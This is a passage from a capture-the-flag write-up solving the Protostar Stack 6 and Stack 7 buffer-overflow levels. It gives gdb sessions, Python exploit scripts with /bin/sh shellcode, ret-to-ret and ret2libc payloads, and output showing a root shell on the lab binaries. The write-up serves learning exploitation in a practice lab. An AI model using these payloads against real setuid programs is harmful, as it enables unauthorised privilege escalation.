#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

The goal of this level is to gain **root privileges**.

Similar to `Stack 5`, we will create a payload to overwrite the return address of the **getpath** function, redirecting program execution to our shellcode.

However, if you examine the program in `gdb`, you will notice that the stack ranges from **0xbffeb000** to **0xc0000000**. This means we cannot run our shellcode on the stack because the comparison `ret & 0xbf000000 == 0xbf000000` prevents it from executing. In other words, we cannot overwrite the return address with a location on the stack.

Represention of the progarm in `gdb`:

``` shell
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) break *getpath
Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, getpath () at stack6/stack6.c:7
7       stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc map
process 1980
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

So, to solve this level, I have 2 solutions:
- Overwrite the return address of **getpath** with the address of **ret** instruction inside the **getpath** function.
- Use **ret2libc**.

### Solution 1

First of all, I create a simple script to find the offset where the return address is located on the stack for padding purposes. 

My simple script:

``` python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

print padding
```

Now, I redirect the output of this script to a file and use it as input while running the program in `gdb`:

``` shell
user@protostar:~$ python script.py > /tmp/exp
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) disassemble getpath
Dump of assembler code for function getpath:
.....
0x080484f9 <getpath+117>:       ret
End of assembler dump.
(gdb) break *0x080484f9
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack6 < /tmp/exp
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
0x80484f9 <getpath+117>:        ret
0xbffff79c:     0x55555555      0x56565656      0x57575757      0x58585858
0xbffff7ac:     0x59595959      0x5a5a5a5a      0xbffff800      0xbffff85c

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
.....
```

From this, I can see that the return address has been replaced with **0x55555555**, where **0x55** corresponds to the character 'U'. This means our padding ranges from 'A' to 'T'.

Now, I will overwrite **0x55555555** (the return address) with the address of the ret instruction inside the getpath function, which is **0x080484f9**.

This trick makes the program execute the **ret** instruction twice. The ***first ret*** jumps to our chosen ret instruction, and ***the second ret*** allows us to return to an address on the stack. 

Here is a clearer representation:

``` shell

1. BEFORE OVERWRITING THE RETURN ADDRESS

[ Buffer Overflow Happens ]
------------------------------------------------------
| AAAA....TTTT  |  0x55555555  |  Old EBP  |  Ret Addr |
------------------------------------------------------
                             ▲
                             └── This is where we overwrite


2. OVERWRITING THE RETURN ADDRESS WITH 0x080484f9  

------------------------------------------------------
| AAAA....TTTT  |  0x080484f9  |  STACK_ADDR  |  Ret Addr |
------------------------------------------------------
                             ▲
                             └── First ret executes, popping 0x080484f9 from the stack
                          

3. THE SECOND RET

------------------------------------------------------
| AAAA....TTTT  |  0x080484f9  |  STACK_ADDR  |  SHELLCODE_ADDR |
------------------------------------------------------
                                            ▲
                                            └── Second ret pops this value & jumps to our shellcode
```

This is my script, and the link to the shellcode that I use => [shellcode](https://shell-storm.org/shellcode/files/shellcode-575.html).

``` python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
ret = struct.pack("I", 0x080484f9)
eip = struct.pack("I", 0xbffff7a0 + 0x30)
nopslide = "\x90"*100
int3 = "\xCC"
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

print padding + ret + eip + nopslide + int3 + shellcode
```

Running the script in `gdb`:

``` shell
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) disassemble getpath
Dump of assembler code for function getpath:
.....
0x080484f9 <getpath+117>:       ret
End of assembler dump.
(gdb) break *0x080484f9
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack6 < /tmp/exp
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP�RRRRSSSSTTTT����������������������������������������������������������������������������������������������������������j
                                             X�Rh//shh/bin��1�̀
0x80484f9 <getpath+117>:        ret
0xbffff79c:     0x080484f9      0xbffff7d0      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) si
0x80484f9 <getpath+117>:        ret
0xbffff7a0:     0xbffff7d0      0x90909090      0x90909090      0x90909090
0xbffff7b0:     0x90909090      0x90909090      0x90909090      0x90909090

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      in stack6/stack6.c
(gdb)
Cannot access memory at address 0x54545458
(gdb)
0xbffff7d1:     nop
0xbffff7a4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7b4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7d1 in ?? ()
.....
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff809:     push   $0xb
0xbffff7a4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7b4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff809 in ?? ()
(gdb) c
Continuing.
Executing new program: /bin/dash
```

I remove **int3** from the script, and BUMPP, we successfully deal with the return address restriction in this level.

```shell
user@protostar:~$ (python script.py ; cat) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP�RRRRSSSSTTTT���������������������������������������������������������������������������������������������������������j
                                            X�Rh//shh/bin��1�̀
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

### Solution 2

Since this solution uses `Ret2libc`. I will start with a scenario that demonstrates **system** function to help grasp the concept more easily.

``` c
#include <stdlib.h>

void main() {
  system("/bin/sh");
}
```

Compile this C code and disassemble it using `gdb`:

``` shell
user@protostar:~$ gcc sys.c -o sys
user@protostar:~$ gdb ./sys
.....
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x10
0x080483cd <main+9>:    mov    DWORD PTR [esp],0x80484a0
0x080483d4 <main+16>:   call   0x80482ec <system@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) x/s 0x80484a0
0x80484a0:       "/bin/sh"
```

At this point, the program first pushes the address of the string ("/bin/sh" in this case) onto the stack as an argument for `system()`. Right after that comes the return address so that the execution can resume after the function.

So right now, our stack looks like this: 

``` shell
|      .....       |  <--------- Higher address
|------------------|
|  "/bin/sh" addr  |  
|------------------|
|  Return Address  | 
|------------------|
|      .....       |  <--------- Lower address
|------------------|
```

You might think how does this help us to solve the problem right? The answer lies in the process of overwriting the return address of **getpath** function. 

By doing so, we can redirect program execution to `system()`, which means the **ret** instruction acts as an indirect call to **system()**. And we will set up the stack just like in the scenario above, placing the return address of the call to **system** and the argument ***"/bin/sh"*** for it! 

Stack representation for our solution:

``` shell
|      .....       |  <--------- Higher address
|------------------|
|  "/bin/sh" addr  | 
|------------------|
| Fake return addr |  
|------------------|
|  system() addr   | 
|------------------|
|     Padding      | 
|------------------|
|      .....       |  <--------- Lower address
```

Now, I will find the address of **system**:

``` shell
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) break *getpath
Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7.
(gdb) r
...
(gdb) p system          
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

For the string **"/bin/sh**:

``` shell
(gdb) info proc map
process 2272
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) quit
.....
user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```

I use `gdb` to find the base address of **libc** in memory (0xb7e97000). Then, I use strings to locate the offset of **"/bin/sh"** inside libc (0x11f3bf). 

By adding these two values together, I compute the address of **"/bin/sh"**: 0xb7e97000 + 0x11f3bf = 0xb7fb63bf.

Here is my script:

``` shell
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
system = struct.pack("I", 0xb7ecffb0)
fake_ret = "A" * 4
bin_sh = struct.pack("I", 0xb7fb63bf)

print padding + system + fake_ret + bin_sh
```

And we beat this level using `Ret2libc` ^^

``` shell
user@protostar:~$ (python script.py ; cat) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP���RRRRSSSSTTTT���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

## Stack 7

Description:

>Stack6 introduces return to .text to gain code execution.
>
>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.
>
>This level is at /opt/protostar/bin/stack7

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

In this level, I will combine the two techniques that I use in `Stack 6`. 

While analyzing the program in `gdb`, I notice that the address of **system()** is **0xb7ecffb0** This means I cannot use `Ret2libc` alone to overwrite the return address of **getpath** function on the stack with the address of **system** because the check `ret & 0xb0000000 == 0xb0000000` prevents it from executing if the return address starts with `0xb`.

``` shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

To bypass this return address retriction, I use **the first solution in Stack 6**, where I return to the **ret** instruction twice. 

Below is a representation of the stack, which I will use to create a payload that can help me get **root privileges**.

``` shell
|      .....       |  <--------- Higher address
|------------------|
|  "/bin/sh" addr  | 
|------------------|
| Fake return addr |  
|------------------|
|  system() addr   | 
|------------------|
|     ret addr     | 
|------------------|
|     Padding      | 
|------------------|
|      .....       |  <--------- Lower address
```

To locate the **ret** instruction and the address of **system()**, I use the following `gdb` commands:

``` shell
(gdb) disassemble getpath
...
0x08048544 <getpath+128>:       ret
End of assembler dump.
(gdb) p system
$4 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

Next, I need to determine the base address of **libc** and find the address of the ***"/bin/sh"*** string using the `strings` command:

``` shell
(gdb) info proc map
process 2454
cmdline = '/opt/protostar/bin/stack7'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
         0x804a000  0x806b000    0x21000          0           [heap]
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fde000 0xb7fe2000     0x4000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) quit
....
user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```

So, the address of **"/bin/sh"** is 0xb7e97000 + 0x11f3bf.

Here is my script:

``` python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
ret = struct.pack("I", 0x08048544)
system = struct.pack("I", 0xb7ecffb0)
return_after_system = "AAAA"
bin_sh = struct.pack("I", 0xb7e97000 + 0x11f3bf)

print padding + ret + system + return_after_system + bin_sh
```

Now, we beat this level :D

``` shell
user@protostar:~$ (python script.py ; cat) | /opt/protostar/bin/stack7
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```